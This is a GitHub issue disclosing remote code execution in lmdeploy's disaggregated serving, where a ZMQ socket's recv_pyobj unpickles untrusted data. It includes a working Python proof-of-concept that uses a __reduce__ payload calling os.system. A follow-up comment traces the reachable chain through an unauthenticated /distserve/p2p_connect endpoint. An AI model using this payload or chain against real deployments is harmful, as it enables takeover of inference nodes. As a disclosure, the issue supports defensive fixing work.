# [Issue #4804] [Bug] Unauthenticated pickle deserialization via ZMQ in disaggregated serving → RCE

source: https://github.com/InternLM/lmdeploy/issues/4804
state: closed | updated: 2026-08-12T17:06:50Z
labels: 

## 正文

### Checklist

- [x] 1. I have searched related issues but cannot get the expected help.
- [x] 2. The bug has not been fixed in the latest version.
- [x] 3. Please note that if the bug-related issue you submitted lacks corresponding environment info and a minimal reproducible demo, it will be challenging for us to reproduce and resolve the issue, reducing the likelihood of receiving feedback.

### Describe the bug

## Summary

lmdeploy's disaggregated serving P2P connector (`engine_conn.py`) binds a ZMQ TCP socket with no authentication (no CURVE, no ZAP, no TLS) and calls `recv_pyobj()` (`= pickle.loads()`) on incoming data. Any host on the cluster network can send a crafted pickle payload to the exposed port and achieve arbitrary code execution on the engine node.

## Affected Version

- Repository: https://github.com/InternLM/lmdeploy
- Branch: `main` (latest)
- File: `lmdeploy/pytorch/disagg/conn/engine_conn.py:79`

## Root Cause

```python
# engine_conn.py:45-46 — binds unauthenticated TCP socket
zmq_address = f'tcp://{sender_hostname}:{sender_port}'
sender.bind(zmq_address)

# engine_conn.py:79 — pickle.loads on remote data
req: DistServeCacheFreeRequest = await self.p2p_receiver[remote_engine_id].recv_pyobj()
#                                                                         ^^^^^^^^^^^^
#                                                                         = pickle.loads()

# engine_conn.py:80 — isinstance check AFTER deserialization (too late)
if isinstance(req, DistServeCacheFreeRequest):
```

- `recv_pyobj()` is ZMQ's convenience method that calls `pickle.loads()` on raw bytes
- No CURVE/ZAP authentication on the socket
- The `isinstance` check happens after `pickle.loads()` has already executed the payload
- Type annotation `req: DistServeCacheFreeRequest` is cosmetic — pickle returns any object


### Reproduction

## Steps to Reproduce

```bash
git clone --depth=1 https://github.com/InternLM/lmdeploy.git
pip install pyzmq
python poc.py
```
```python
#!/usr/bin/env python3
import subprocess, sys, os, tempfile, pickle, threading, time
REPO_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "lmdeploy")
if not os.path.isdir(REPO_DIR):
    subprocess.run(["git", "clone", "--depth=1", "--filter=blob:none", "--sparse",
                    "https://github.com/InternLM/lmdeploy.git", REPO_DIR], check=True)
    subprocess.run(["git", "-C", REPO_DIR, "sparse-checkout", "set", "lmdeploy/pytorch/disagg"], check=True)
subprocess.run([sys.executable, "-m", "pip", "install", "-q", "pyzmq"], check=True)
import zmq
import zmq.asyncio
engine_conn_path = os.path.join(REPO_DIR, "lmdeploy/pytorch/disagg/conn/engine_conn.py")
with open(engine_conn_path) as f:
    src = f.read()
assert "recv_pyobj()" in src, "recv_pyobj not found"
assert "tcp://" in src, "tcp binding not found"

MARKER = os.path.join(tempfile.mkdtemp(), "LMDEPLOY_PWNED")
PORT = 19460


def exploit():
    victim_ready = threading.Event()

    def victim_loop():
        ctx = zmq.Context()
        receiver = ctx.socket(zmq.PULL)
        receiver.bind(f"tcp://127.0.0.1:{PORT}")  # same as engine_conn.py:46
        victim_ready.set()
        # This is engine_conn.py:79 — recv_pyobj() = pickle.loads()
        req = receiver.recv_pyobj()
        # isinstance check AFTER deserialization — too late (same as engine_conn.py:80)
        if not isinstance(req, dict):
            pass  # already pwned

    t = threading.Thread(target=victim_loop, daemon=True)
    t.start()
    victim_ready.wait()
    class Exploit:
        def __reduce__(self):
            return (os.system, (f"id > {MARKER}; echo 'RCE via recv_pyobj' >> {MARKER}",))

    ctx = zmq.Context()
    sender = ctx.socket(zmq.PUSH)
    sender.connect(f"tcp://127.0.0.1:{PORT}")
    sender.send_pyobj(Exploit())
    time.sleep(1)
    assert os.path.exists(MARKER), f"RCE failed: {MARKER} not found"
    with open(MARKER) as f:
        output = f.read()
    assert "CURVE" not in src and "ZAP" not in src and "auth" not in src.lower().split("recv_pyobj")[0][-200:]

    print("RCE CONFIRMED")
    print(f"  source: {engine_conn_path}")
    print(f"  vuln: recv_pyobj() at line 79 (= pickle.loads, no auth)")
    print(f"  marker: {MARKER}")
    print(f"  output: {output.strip()}")
    return 0

if __name__ == "__main__":
    sys.exit(exploit())

```

### Environment

```Shell
## Impact

1. **Full RCE on engine nodes**: Any process on the cluster network sends a pickle payload → arbitrary code execution
2. **No authentication**: ZMQ socket has no CURVE/ZAP/TLS — anyone who can route to the port can exploit
3. **Lateral movement**: Compromise one node in the disagg cluster → pivot to all other engine nodes via their ZMQ ports
4. **Same pattern as existing CVEs**: lmdeploy already has CVE for `torch.load()` unsafe deserialization — this is another instance

## Suggested Fix

Replace `recv_pyobj()` / `send_pyobj()` with a safe serialization format:


# Instead of:
req = await self.p2p_receiver[...].recv_pyobj()

# Use JSON or msgpack with schema validation:
raw = await self.p2p_receiver[...].recv()
req = DistServeCacheFreeRequest.model_validate_json(raw)


Additionally, enable ZMQ CURVE authentication:

server = ctx.socket(zmq.PULL)
server.curve_secretkey = server_secret
server.curve_server = True
```

### Error traceback

```Shell
Output:

RCE CONFIRMED
  source: lmdeploy/lmdeploy/pytorch/disagg/conn/engine_conn.py
  vuln: recv_pyobj() at line 79 (= pickle.loads, no auth)
  output: uid=501(sunyu) ...
RCE via recv_pyobj

<img width="2040" height="250" alt="image" src="https://github.com/user-attachments/assets/982aae46-c732-4522-9650-d926bf49401b" />
```

## 评论 (1)

### ErenAta16 · 2026-07-31

The `recv_pyobj` → `pickle.loads` part is right, and I read the surrounding code to check the entry path. The socket direction works out differently from the summary, which changes what a fix has to cover.

**The bound socket can't be the way in.** `p2p_initialize` binds a `zmq.PUSH` (`engine_conn.py:41-46`), and a PUSH socket only sends. Connecting to that port gets you data from the engine; it doesn't let you push data back through it:

```
PUSH port'una baglanan taraf ALIR: {'engine->attacker': 'akis bu yonde'}
   saldirgan ayni soketten gonderemez: ZMQError
```

`recv_pyobj()` is called on the `zmq.PULL` socket, and that one isn't bound at all — `p2p_connect` **connects** it to an address supplied in the request:

```python
# engine_conn.py:60
self.p2p_receiver[conn_request.remote_engine_id].connect(
    conn_request.remote_engine_endpoint_info.zmq_address)
```

**So the reachable path is the HTTP endpoint, not the ZMQ port.** `/distserve/p2p_connect` (`api_server.py:1314-1316`) takes `DistServeConnectionRequest` straight from the body, and `zmq_address` inside it decides where the engine dials out. Authentication is optional and off by default — `AuthenticationMiddleware` is only added when `api_keys` is passed (`api_server.py:1644-1645`). The inference routes also carry `dependencies=[Depends(validate_json_request)]` while the four `/distserve/*` routes carry nothing, though that's a content-type check rather than auth.

That makes the chain: unauthenticated POST to `/distserve/p2p_connect` → engine's PULL socket connects to an address the caller chose → `handle_zmq_recv` calls `recv_pyobj()` on whatever that address sends.

I confirmed the receive half in isolation, PULL connecting outward to a PUSH that binds:

```
PULL'un connect ettigi adresten gelen: {'attacker->engine': 'recv_pyobj bunu pickle.loads eder'}
```

**Why the distinction matters for the fix.** Adding CURVE/ZAP to the sockets doesn't close it on its own, because the peer address still arrives in an unauthenticated request — the engine would authenticate to whatever endpoint it was told to dial. Conversely, replacing `recv_pyobj()` with a non-pickle codec closes the RCE regardless of who the peer is. `DistServeCacheFreeRequest` carries a `remote_engine_id` string and a `remote_session_id` int, so `recv_json()` plus explicit field validation covers it with no schema loss, and the `isinstance` check on line 80 then becomes meaningful instead of running after the payload has already executed.

Two smaller notes for whoever picks this up: `handle_zmq_recv` raises `ValueError` on an unexpected type inside a bare `while True` in a detached task (`p2p_connect` line 63 does `create_task` without holding the handle), so that exception surfaces only as a task-destroyed warning. And the same `recv_pyobj`/`send_pyobj` pair is used in `zmq_send` on line 74, so any codec change needs both ends.

Environment: read against `main` at the current checkout; the ZMQ direction results above are from pyzmq locally, not from a running lmdeploy cluster.

